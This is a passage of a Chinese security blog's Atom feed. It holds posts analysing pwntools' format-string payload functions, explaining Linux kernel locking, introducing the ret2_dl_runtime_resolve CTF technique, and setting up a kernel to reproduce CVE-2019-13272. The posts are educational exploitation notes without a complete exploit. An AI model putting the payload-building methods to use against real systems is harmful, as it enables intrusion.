WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = b&quot;&quot;</span><br><span class="line">    for _ in range(1000000):</span><br><span class="line">        data_offset = (offset_bytes + len(fmt)) // context.bytes</span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten)</span><br><span class="line">        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)</span><br><span class="line"></span><br><span class="line">        if len(fmt) + offset_bytes == data_offset * context.bytes:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise RuntimeError(&quot;this is a bug ... format string building did not converge&quot;)</span><br><span class="line"></span><br><span class="line">    return fmt + data</span><br></pre></td></tr></table></figure><p>再分析一个函数为fmtstr_split()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def fmtstr_split(offset, writes, numbwritten=0, write_size=&apos;byte&apos;, write_size_max=&apos;long&apos;, overflows=16, strategy=&quot;small&quot;, badbytes=frozenset()):</span><br><span class="line">    if write_size not in [&apos;byte&apos;, &apos;short&apos;, &apos;int&apos;]:</span><br><span class="line">        log.error(&quot;write_size must be &apos;byte&apos;, &apos;short&apos; or &apos;int&apos;&quot;)</span><br><span class="line">    if write_size_max not in [&apos;byte&apos;, &apos;short&apos;, &apos;int&apos;, &apos;long&apos;]:</span><br><span class="line">        log.error(&quot;write_size_max must be &apos;byte&apos;, &apos;short&apos;, &apos;int&apos; or &apos;long&apos;&quot;)</span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line">    return make_payload_dollar(offset, atoms, numbwritten)</span><br></pre></td></tr></table></figure><p>解释一下重要的参数:</p><ul><li>offset是偏移</li><li>write为一个字典存储着{addr:val}的键值对</li><li>numberwriten是printf已经输出的字符长度</li><li>write_size是以什么方式，有四个选项<ul><li>byte:hhn</li><li>short:hn</li><li>int:n</li><li>long:lln</li></ul></li><li>write_size_max就是地址是多长的<ul><li>byte：1个字节</li><li>short：2个字节</li><li>int：4个字节</li><li>long：8个字节</li></ul></li></ul><p>返回值有为一个数组为payload和编码之后的地址，这样stack不在栈上的时候，可以利用fmtstr_split()函数来构造payload</p><h2 id="0x00-总结"><a href="#0x00-总结" class="headerlink" title="0x00 总结"></a>0x00 总结</h2><p>pwntools fmtstr模块很好的实现了对于格式化字符串buf在stack上的情况，对于buf不在stack，麻烦一点，需要自行构造</p><h1 id="0x03-ROP类"><a href="#0x03-ROP类" class="headerlink" title="0x03 ROP类"></a>0x03 ROP类</h1>]]></content>
    
    <summary type="html">
    
      这里主要分析一下pwntools的rop和fmtstr模块源码#
    
    </summary>
    
    
    
      <category term="pwn,tools" scheme="http://yoursite.com/tags/pwn-tools/"/>
    
  </entry>
  
  <entry>
    <title>linux内核同步机制总结</title>
    <link href="http://yoursite.com/2019/12/06/linux%E5%86%85%E6%A0%B8%E5%90%8C%E6%AD%A5%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/06/linux内核同步机制总结/</id>
    <published>2019-12-06T08:06:39.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>学习内核，遇到最多的问题就是条件竞争，然后，再复杂一点的条件竞争就要利用到内核的同步机制，之前一直很迷，现在，总结一下。</p><h1 id="0x01-条件竞争"><a href="#0x01-条件竞争" class="headerlink" title="0x01 条件竞争"></a>0x01 条件竞争</h1><p>对于用户态的程序一般不会有条件竞争的情况出现，因为，进程和进程之间总是独立的，都有自己独立的空间，用户态的程序在计算机系统层面一般扮演的是客户端的角色，而内核扮演的是服务端的角色，内核提供着多种服务，每一个用户态的进程都可以请求某一种的服务，而每一种服务，不可避免的需要声明一些全局变量来维持服务的正常运行，如果多个进程同时对某一全局变量进行直接或者间接的操作，就可能损坏全局变量，轻则服务崩溃，重则导致非预期程序流，内核提供了多种同步机制来解决条件竞争的问题</p><h1 id="0x02-同步机制"><a href="#0x02-同步机制" class="headerlink" title="0x02  同步机制"></a>0x02  同步机制</h1><p>主要介绍以下几种内核同步机制：</p><ul><li>原子操作</li><li>自旋锁</li><li>互斥锁</li><li>RCU</li><li>读写锁</li></ul><h2 id="0x00-原子操作"><a href="#0x00-原子操作" class="headerlink" title="0x00 原子操作"></a>0x00 原子操作</h2><p>具体用法参考linux源码 <strong>linux-master/Documentation/atomic_t.txt</strong> 的详细描述</p><p>具体实现在 <strong> </strong>linux-master/arch/architecture/include/asm/atomic.h** architecture为具体的架构，如x86</p><p>（<del>Documentation这个目录真香，之前就知道这么里面有内核的描述，没想到这么详细</del>）</p><p>我们一般对一个变量操作分这么几步：</p><ul><li>在内存中取出变量放到寄存器</li><li>操作变量</li><li>写回内存</li></ul><p>在这三步中间，中断的话，就可能出问题，所以，原子操作就是解决这种问题，保证完成之前这些步骤不被中断，（<del>形象点就是说把这三个步骤封装成一个步骤，原子操作不可再分</del>）</p><p>列出常用的函数，还有一些没写。。。。</p><blockquote><p>atomic_read(atomic_t *v)  读取原子变量的值 </p><p>atomic_set(atomic_t *v, int i)  将v设置为i </p><p>atomic_add(int i, atomic_t *v)  将i加到v </p><p>atomic_add_return(int i, atomic_t *v)  将i加到v，并返回结果 </p><p>atomic_sub(int i, atomic_t *v)  从v减去i </p><p>atomic_sub_return(int i, atomic_t *v)  从v减去i，并返回结果 </p><p>atomic_sub_and_test(int i, atomic_t <em>v)  从v减去v。如果结果为0则返回true，否则返回false atomic_inc(atomic_t </em>v) 将v加1 </p><p>atomic_inc_and_test(atomic_t *v) 将v加1。如果结果为0则返回true，否则返回false </p><p>atomic_dec(atomic_t *v) 从v减去1 </p><p>atomic_dec_and_test(atomic_t <em>v) 从v减去1。如果结果为0则返回true，否则返回false atomic_add_negative(int i, atomic_t </em>v) 将i加到v。如果结果小于0则返回true，否则返回false atomic_add_negative(int i, atomic_t *v) 将i加到v。如果结果为负则返回true，否则返回false </p></blockquote><h2 id="0x01-自旋锁"><a href="#0x01-自旋锁" class="headerlink" title="0x01 自旋锁"></a>0x01 自旋锁</h2><h3 id="0x00-临界区"><a href="#0x00-临界区" class="headerlink" title="0x00  临界区"></a>0x00  临界区</h3><p>说到锁，就不得不提 <strong>临界区</strong> 这个概念，就是说规划一段代码区域，在这段代码区域内，在同一时间内只允许一个进程运行这段代码（<del>可能不太准确，大概是这个意思</del>），其他进程会以各种方式阻挡在临界区之外，我个人理解临界区只是一个抽象化的概念，实际的实现，就是各种锁的机制，如果你细节的去想内核的各种同步机制，其实他们都是实现了临界区这个概念，包括原子操作，从而实现，在同一时间只有一个进程去操作同一变量</p><h3 id="0x01-自旋锁的思想"><a href="#0x01-自旋锁的思想" class="headerlink" title="0x01 自旋锁的思想"></a>0x01 自旋锁的思想</h3><p>每个进程访问临界区时都要获取自旋锁，自旋锁只能由一个进程持有，当进程离开临界区的时候，就要释放自旋锁，如果，获得不到锁，此进程就会一直进行空操作</p><p>具体参考：<strong>linux-master/Documentation/spinlocks.rst</strong></p><h2 id="0x02-互斥锁"><a href="#0x02-互斥锁" class="headerlink" title="0x02 互斥锁"></a>0x02 互斥锁</h2><p>互斥锁是自旋锁的一个变种，只有一个能够持有锁，他和自旋锁的一个重要区别就是当一个进程进入临界区的时候，如果获取不到锁，就会把当前进程睡眠，所以，在临界区内可以中断的情况下，就不能选择自旋锁，最好选择互斥锁</p><h2 id="0x03-RCU（Read-Copy-Update）"><a href="#0x03-RCU（Read-Copy-Update）" class="headerlink" title="0x03 RCU（Read-Copy Update）"></a>0x03 RCU（Read-Copy Update）</h2><p>这种机制的思想是可以有多个读者，但是，更新数据的时候，需要先复制一个副本，在副本上完成修改，在所有 进行读访问的使用者结束对旧副本的读取之后，指针可以替换为指向新的、修改后副本的指针，我们可以发现这种机制有写滞后效果，单单靠这一种同步机制，很难来避免条件竞争，有的时候反而给漏洞利用提供便利，由于这种同步机制在某些情况下优异的性能，这种机制在内核用的很广泛，这种机制主要用于对共享资源的访问在大部分时间应该是只读的，写访问应该相对很少的情况，接下来，主要介绍一下用法</p><p><strong>rcu_read_lock()</strong> 函数标志着临界区的开始，<strong>rcu_read_unlock()</strong> 函数标志着临界区的结束，在临界区内不允许中断、睡眠，禁止和启用抢占，在临界区内不能直接访问一个指针，需要用到 <strong>rcu_dereference(ptr)</strong> 来获取一个受保护指针，修改一个受保护的指针也是不能直接修改的需要 <strong>rcu_assign_pointer(ptr,new_ptr)</strong> 函数来修改，那么什么时候写回到原来的指针呢，内核提供了两个函数 </p><ul><li><strong>synchronize_rcu()</strong> 等待所有现存的读访问完成，在该函数返回之后，释放原指针 ，更新指针为新指针</li><li><strong>call_rcu()</strong> 可用于注册一个函数，在所有针对共享资源的读访问完成之后调用，执行释放和更新的操作</li></ul><h2 id="0x04-读写锁"><a href="#0x04-读写锁" class="headerlink" title="0x04 读写锁"></a>0x04 读写锁</h2><p>读写锁的理念是一个进程写的时候，其他进程不能读写，一个进程读的时候，允许其他进程读，但是不允许写 具体实现是在进入临界区的时候，会加相应的锁（<del>加锁的那一行代码标志临界区的开始。。。</del>），离开临界区时，会释放相应的锁（<del>释放锁的那一行代码标志临界区的结束</del>），但是理想很美好，现实很骨感，如果一个内核驱动，两处引用了同一全局变量，一处有读写锁，另一处没有，同样会引起条件竞争，只是，减少了发生的概率</p><p>具体参考：<strong>linux-master/Documentation/spinlocks.rst</strong></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本来打算好好写写，但是，这周事情有点多，想写的东西有点大，弄巧成拙，写着写着发现没有什么新意（<del>而且还发现写不完2333</del>），只能作为一种总结，如有错误，还请联系我</p><h2 id="0x00-关于锁和信号量-的区别"><a href="#0x00-关于锁和信号量-的区别" class="headerlink" title="0x00 关于锁和信号量 的区别"></a>0x00 关于锁和信号量 的区别</h2><p>我之前一直以为锁和信号量没有区别，其实，他们的思想不同，锁是锁住的资源（比如变量），而信号量同步的进程，信号量的是临界区内的进程数，而他并不能保护临界区内的变量，这个变量，如果在别的地方读写，仍然会发生条件竞争。。。。。</p><p>参考资料:</p><ul><li>深入理解linux内核架构</li><li><p>深入理解linux内核</p></li><li><p>原子操作：<a href="http://www.sohu.com/a/280833660_467784" target="_blank" rel="noopener">http://www.sohu.com/a/280833660_467784</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      内核同步机制总结
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>&#39;ret2_dl_runtime_resolve&#39;</title>
    <link href="http://yoursite.com/2019/12/04/ret2-dl-runtime-resolve/"/>
    <id>http://yoursite.com/2019/12/04/ret2-dl-runtime-resolve/</id>
    <published>2019-12-04T05:01:23.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前一直想写一篇ret2_dl_runtime_resolve的文章，一直没有时间，借此机会分分享一下这种利用方式，虽然，这不是很新的利用方式，但是，这种利用方式，可以通杀某一类栈溢出的题目，可以实现秒题，这里主要是分享一下利用的原理，至于利用，也有现成的工具（<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">roputils</a>），当然，网上关于这种利用方式的文章有好多，可以自行百度，但是有些东西只有自己调试了才是自己的，看着明白，不一定都会用，会用也不一定真正明白原理，有错误之处还请矫正</p><h1 id="0x01-利用场景"><a href="#0x01-利用场景" class="headerlink" title="0x01 利用场景"></a>0x01 利用场景</h1><p>我觉得这种利用方式最好的使用场景是</p><ul><li>linux下32位程序</li><li>partial RELRO/no RELRO</li><li>No PIE</li><li>存在rop或者其他可以控制栈的漏洞</li></ul><p>程序保护参考：<a href="http://47.94.212.159:1948/pwn.md#/3" target="_blank" rel="noopener">http://47.94.212.159:1948/pwn.md#/3</a></p><h1 id="0x02-原理介绍"><a href="#0x02-原理介绍" class="headerlink" title="0x02 原理介绍"></a>0x02 原理介绍</h1><h2 id="0x00-延时绑定机制"><a href="#0x00-延时绑定机制" class="headerlink" title="0x00 延时绑定机制"></a>0x00 延时绑定机制</h2><p>这种利用方式基于延时绑定（lazy binding）机制，简单来说，就是程序载入内存之后，程序所用到的动态链接库函数的地址不会立刻写入got表，而是，在第一次调用动态链接库函数的时候，把动态链接库函数的地址写入got表</p><h2 id="0x01-正常的动态链接库函数写入got表的过程"><a href="#0x01-正常的动态链接库函数写入got表的过程" class="headerlink" title="0x01 正常的动态链接库函数写入got表的过程"></a>0x01 正常的动态链接库函数写入got表的过程</h2><h3 id="0x00-测试环境"><a href="#0x00-测试环境" class="headerlink" title="0x00 测试环境"></a>0x00 测试环境</h3><ul><li><p>ubuntu16.04</p></li><li><p>gcc（需要添加32位支持输入命令 <strong>sudo apt-get install libc6-dev-i386</strong>）</p></li><li>gdb（pwndbg插件）</li></ul><h3 id="0x01-测试源码"><a href="#0x01-测试源码" class="headerlink" title="0x01 测试源码"></a>0x01 测试源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//gcc test.c -o test -m32  -z noexecstack -fno-stack-protector -no-pie  -z lazy</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello&quot;);</span><br><span class="line">    printf(&quot;hello world&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行为编译命令参考：<a href="http://47.94.212.159:1948/pwn.md#/3/7" target="_blank" rel="noopener">http://47.94.212.159:1948/pwn.md#/3/7</a></p><h3 id="0x02-开始调试"><a href="#0x02-开始调试" class="headerlink" title="0x02 开始调试"></a>0x02 开始调试</h3><ul><li>下断点到printf函数之前</li><li>然后si</li></ul><p><img src="/2019/12/04/ret2-dl-runtime-resolve/image-20191204144334064.png" alt="image-20191204144334064"></p><p>可以看到call 的地址为 <strong>080482E0</strong>，这个地址是什么呢</p><p><img src="/2019/12/04/ret2-dl-runtime-resolve/image-20191204144522413.png" alt="image-20191204144522413"></p><p>会jmp到 <strong>[0x0804A00C]</strong>  的地址了，0x0804A00C这个地址就是prinf函数在got表的位置的地址啦</p><p><img src="/2019/12/04/ret2-dl-runtime-resolve/image-20191204144735605.png" alt="image-20191204144735605"></p><p>然后我们可以看到</p><p><img src="/2019/12/04/ret2-dl-runtime-resolve/image-20191204150331212.png" alt="image-20191204150331212"></p><p>接下来的操作是：</p><ul><li>push 0</li><li>push 0x804a004</li><li>jmp [0x804a008] <0xf7fee000></0xf7fee000></li></ul><p>我们可以看到</p>]]></content>
    
    <summary type="html">
    
      这里总结一下ret2_dl_runtime_resolve
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272复现</title>
    <link href="http://yoursite.com/2019/11/24/CVE-2019-13272%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/24/CVE-2019-13272复现/</id>
    <published>2019-11-24T11:16:46.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><h2 id="0x00-确定内核版本"><a href="#0x00-确定内核版本" class="headerlink" title="0x00 确定内核版本"></a>0x00 确定内核版本</h2><p>首先找到漏洞来源：</p><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a></p><p>之后找到漏洞修补的commit</p><p><img src="/2019/11/24/CVE-2019-13272复现/1574594505159.png" alt="1574594505159"></p><p>然后找到漏洞的影响的内核commit 和修补之后的commit</p><p><img src="/2019/11/24/CVE-2019-13272复现/1574594551295.png" alt="1574594551295"></p><p>然后，用git命令diff一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 550d1f5bda33fa3b203d8cf8df1396825dbfd213 6994eefb0053799d2e07cd140df6c2ea106c41ee</span><br></pre></td></tr></table></figure><p>看一下，改了哪些部分，然后，git回滚到漏洞的commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 550d1f5bda33fa3b203d8cf8df1396825dbfd213</span><br></pre></td></tr></table></figure><h2 id="0x01-编译内核"><a href="#0x01-编译内核" class="headerlink" title="0x01 编译内核"></a>0x01 编译内核</h2><p>编译内核，参考：</p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><p>这个库，真的好用。。。。</p><h2 id="0x02-构建文件系统"><a href="#0x02-构建文件系统" class="headerlink" title="0x02 构建文件系统"></a>0x02 构建文件系统</h2><p>我觉得最好的方案是按照那个md构建文件系统，就能用ssh连接到kernel，不用每次都打包文件系统了</p><p>其他的方案：</p><ul><li><a href="https://www.cnblogs.com/pengdonglin137/p/9540670.html" target="_blank" rel="noopener">https://www.cnblogs.com/pengdonglin137/p/9540670.html</a></li></ul><p>这个自由度高一点，自己得动手，一步步的做，而syzkaller一步到位</p><ul><li>busybox 网上博客很多不再赘述</li></ul><p>构建的时候，有个问题是他要下载好多包，都是国外的，所以，本地就很慢，我的解决方案是：</p><ul><li>用国外的vps构建系统，然后，打包，开一个nginx服务，本地开个vpn在chrome下载</li></ul><p>我也试过bash直接挂代理，效果不佳。。。。</p><h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><ul><li>Failed to start Raise network interfaces</li></ul><p>参考:<br><a href="https://groups.google.com/forum/#!searchin/syzkaller/Failed$20to$20start$20Raise$20network$20interfaces%7Csort:date/syzkaller/ryXUTw9RlJs/btNnI2IDAgAJ" target="_blank" rel="noopener">https://groups.google.com/forum/#!searchin/syzkaller/Failed$20to$20start$20Raise$20network$20interfaces%7Csort:date/syzkaller/ryXUTw9RlJs/btNnI2IDAgAJ</a></p><ul><li>ssh连接不上</li></ul><p>参考：</p><p><a href="https://www.jianshu.com/p/9dbb1dea5929" target="_blank" rel="noopener">https://www.jianshu.com/p/9dbb1dea5929</a></p>]]></content>
    
    <summary type="html">
    
      第一次复现kernel主要是环境搭建坑比较多
    
    </summary>
    
    
    
      <category term="cve,linux kernel" scheme="http://yoursite.com/tags/cve-linux-kernel/"/>
    
  </entry>
  
</feed>
